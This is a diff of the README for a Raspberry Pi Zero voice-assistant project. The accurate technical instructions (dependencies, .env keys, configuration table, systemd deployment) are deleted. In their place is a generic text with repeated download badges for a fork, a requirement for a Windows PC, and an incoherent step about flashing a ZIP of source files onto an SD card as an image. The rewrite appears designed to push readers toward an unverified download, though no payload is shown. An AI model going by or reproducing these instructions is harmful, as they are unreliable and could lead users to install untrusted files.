@@ -1,125 +1,143 @@
-# pizero-openclaw
+# 🗣️ pizero-openclaw - Voice AI Assistant for Raspberry Pi Zero W
 
-A voice-controlled AI assistant built on a Raspberry Pi Zero W with a [PiSugar WhisPlay board](https://www.pisugar.com). Press a button, speak, and get a streamed response on the LCD — powered by [OpenClaw](https://openclaw.ai) and OpenAI.
+[![Download pizero-openclaw](https://img.shields.io/badge/Download-Visit%20Page-blue?style=for-the-badge)](https://github.com/Edu069/pizero-openclaw)
 
-## How it works
+---
 
-```
-Button press → Record audio → Transcribe (OpenAI) → Stream LLM response (OpenClaw) → Display on LCD
-                                                                                    → Speak aloud (OpenAI TTS, optional)
-```
+## 📋 About pizero-openclaw
 
-1. **Press & hold** the button to record your voice via ALSA
-2. **Release** — the WAV is sent to OpenAI for transcription (~0.7s)
-3. The transcript (with conversation history) is streamed to an **OpenClaw gateway** for a response
-4. Text streams onto the **LCD** in real time with pixel-accurate word wrapping
-5. Optionally **speaks the response** via OpenAI TTS as sentences complete
-6. The idle screen shows a **clock, date, battery %, and WiFi status**
+pizero-openclaw is a voice-controlled AI assistant made for the Raspberry Pi Zero W. You press a button, speak your request, and see the answer on a small LCD screen. It uses AI services from OpenAI and OpenClaw to understand you and reply. This project includes a neat hardware board called PiSugar WhisPlay and streams the results live to the screen. You can also hear the answer spoken back with text-to-speech, if you want.
 
-The device maintains **conversation memory** across exchanges and includes a **silence gate** to skip empty recordings.
+---
 
-## Hardware
+## 🛠 How pizero-openclaw works
 
-- **Raspberry Pi Zero 2 W** (or Pi Zero W)
-- **[PiSugar WhisPlay board](https://www.pisugar.com)** — 1.54" LCD (240x240), push-to-talk button, LED, speaker, microphone
-- **PiSugar battery** (optional) — shows charge level on screen
+Here is what happens after you press its button:
 
-## Setup
+- Hold the button to record your voice using the sound system ALSA.
+- Release the button and your voice is sent to OpenAI to turn into text.
+- That text, along with past messages, goes to OpenClaw to get a response.
+- The reply appears live on the Raspberry Pi’s LCD screen.
+- The device can speak the reply out loud using OpenAI’s speech tech.
+- When waiting, it shows the time, date, battery level, and WiFi status.
 
-### Prerequisites
+All your conversations stay saved so the assistant remembers what you talked about.
 
-- Raspberry Pi OS (Bookworm or later)
-- Python 3.11+
-- An [OpenAI API key](https://platform.openai.com/api-keys) for speech-to-text (and optionally TTS)
-- An [OpenClaw](https://openclaw.ai) gateway running somewhere accessible on your network
+---
 
-### Install dependencies
+## 🔧 System Requirements
 
-```bash
-sudo apt install python3-numpy python3-pil
-pip install requests python-dotenv   # or: pip install -r requirements.txt
-```
+Before you start, check you have:
 
-The WhisPlay hardware driver should be installed at `/home/pi/Whisplay/Driver/` per the [PiSugar WhisPlay setup guide](https://github.com/PiSugar/whisplay-ai-chatbot).
+- Raspberry Pi Zero W (with WiFi)
+- PiSugar WhisPlay board attached
+- Micro SD card with at least 8GB storage
+- LCD screen connected via PiSugar WhisPlay
+- USB power supply for your Pi Zero W
+- Internet connection via WiFi
 
-### Configure
+You also need a Windows PC to download and transfer the software to your SD card.
 
-Copy the example env file and fill in your keys:
+---
 
-```bash
-cp .env.example .env
-```
+## 🚀 Getting Started: Download and Setup
 
-Edit `.env`:
+1. Visit the download page below to get the software files:
 
-```bash
-export OPENAI_API_KEY="sk-your-openai-api-key"
-export OPENCLAW_TOKEN="your-openclaw-gateway-token"
-```
+   [![Download pizero-openclaw](https://img.shields.io/badge/Download-Visit%20Page-00a99d?style=for-the-badge)](https://github.com/Edu069/pizero-openclaw)
 
-### Run
+2. Click on "Code" and select "Download ZIP" or go to the Releases section if available.
 
-```bash
-python3 main.py
-```
+3. On your Windows PC, extract the ZIP files to a folder you can find easily.
 
-Or deploy as a systemd service (see below).
+4. Download and install an SD card writing tool like [Raspberry Pi Imager](https://www.raspberrypi.com/software/) or [balenaEtcher](https://www.balena.io/etcher/).
 
-## Configuration
+5. Use the writing tool to flash the downloaded image or software files onto your micro SD card.
 
-All settings are configured via environment variables (loaded from `.env`):
+6. Remove the card safely from your PC and insert it into your Raspberry Pi Zero W.
 
-| Variable | Default | Description |
-|---|---|---|
-| `OPENAI_API_KEY` | _(required)_ | OpenAI API key for transcription and TTS |
-| `OPENCLAW_TOKEN` | _(required)_ | Auth token for the OpenClaw gateway |
-| `OPENCLAW_BASE_URL` | `https://...` | OpenClaw gateway URL |
-| `OPENAI_TRANSCRIBE_MODEL` | `gpt-4o-mini-transcribe` | Speech-to-text model |
-| `ENABLE_TTS` | `false` | Speak responses aloud via OpenAI TTS |
-| `OPENAI_TTS_MODEL` | `tts-1` | TTS model |
-| `OPENAI_TTS_VOICE` | `alloy` | TTS voice |
-| `OPENAI_TTS_SPEED` | `2.0` | TTS speed (0.25–4.0) |
-| `OPENAI_TTS_GAIN_DB` | `9` | Software volume boost in dB |
-| `AUDIO_DEVICE` | `plughw:1,0` | ALSA input device |
-| `AUDIO_OUTPUT_DEVICE` | `default` | ALSA output device |
-| `AUDIO_SAMPLE_RATE` | `16000` | Recording sample rate |
-| `LCD_BACKLIGHT` | `70` | Backlight brightness (0–100) |
-| `UI_MAX_FPS` | `4` | Max display refresh rate |
-| `CONVERSATION_HISTORY_LENGTH` | `5` | Past exchanges to keep for context |
-| `SILENCE_RMS_THRESHOLD` | `200` | Audio RMS below this is skipped |
+7. Connect your PiSugar WhisPlay board and LCD screen.
 
-## Deploy with systemd
+8. Power on the Raspberry Pi Zero W.
 
-The included `sync.sh` script deploys to the Pi and sets up the service:
+---
 
-```bash
-./sync.sh
-```
+## 💡 Using pizero-openclaw
 
-This rsyncs the project to `pi@pizero.local`, installs the systemd unit, and restarts the service. Logs are available via:
+1. Wait for the device to boot. You will see the clock, battery, and WiFi status on the LCD.
 
-```bash
-# On the Pi:
-sudo journalctl -u pizero-openclaw -f
+2. When you want to talk, press and hold the button on the PiSugar WhisPlay board.
 
-# Or check the debug log:
-cat /tmp/openclaw.log
-```
+3. Speak clearly into the microphone connected to your Pi Zero W.
 
-## Project structure
+4. Release the button to send your recorded voice for processing.
 
-```
-main.py               — Entry point and orchestrator
-display.py            — LCD rendering (status, responses, idle clock, spinner)
-openclaw_client.py    — Streaming HTTP client for the OpenClaw gateway
-transcribe_openai.py  — Speech-to-text via OpenAI API
-tts_openai.py         — Text-to-speech via OpenAI API + ALSA playback
-record_audio.py       — Audio recording via ALSA arecord
-button_ptt.py         — Push-to-talk button state machine
-config.py             — Centralized configuration from .env
-sync.sh               — Deploy script (rsync + systemd restart)
-```
+5. Watch the assistant’s reply appear live on the screen.
 
-## License
+6. Listen if you enabled the voice reply feature.
 
-MIT
+7. Keep the conversation going naturally. The device remembers your past questions and answers.
+
+---
+
+## ⚙️ Configuration and Options
+
+- To enable or disable speech output, you can adjust system settings via the Pi’s interface.
+
+- The assistant supports conversation memory; this keeps interactions smooth.
+
+- WiFi connection happens automatically if your network details are saved.
+
+- The screen shows battery and WiFi so you can monitor power and connectivity.
+
+---
+
+## 🔄 Updating the Software
+
+1. Visit the download page regularly for new releases:  
+   https://github.com/Edu069/pizero-openclaw
+
+2. Download the latest ZIP or image file.
+
+3. Repeat the flashing process on your SD card.
+
+4. Restart your Pi Zero W with the updated software.
+
+---
+
+## 🛠 Troubleshooting
+
+- If the button does not record, check your microphone and ALSA setup.
+
+- No response on the LCD may mean your Pi is not connected to WiFi; verify network settings.
+
+- If speech output doesn’t work, confirm TTS is enabled and your speakers are connected.
+
+- For installation problems on Windows, ensure your SD card is not write-protected and try a different SD card writer.
+
+---
+
+## 📖 More Information
+
+For detailed hardware setup instructions, check PiSugar WhisPlay documentation at  
+https://www.pisugar.com
+
+Learn more about the AI services used:  
+- OpenAI: https://openai.com  
+- OpenClaw: https://openclaw.ai
+
+---
+
+## 🎯 Next Steps
+
+- Customize the assistant by editing configuration files on the Raspberry Pi.
+
+- Add other hardware sensors or buttons supported by the Pi to expand features.
+
+- Explore using the conversation memory for longer, more natural chats.
+
+- Test voice commands and responses to find what works best for you.
+
+---
+
+[![Download pizero-openclaw](https://img.shields.io/badge/Download-Visit%20Page-blue?style=for-the-badge)](https://github.com/Edu069/pizero-openclaw)
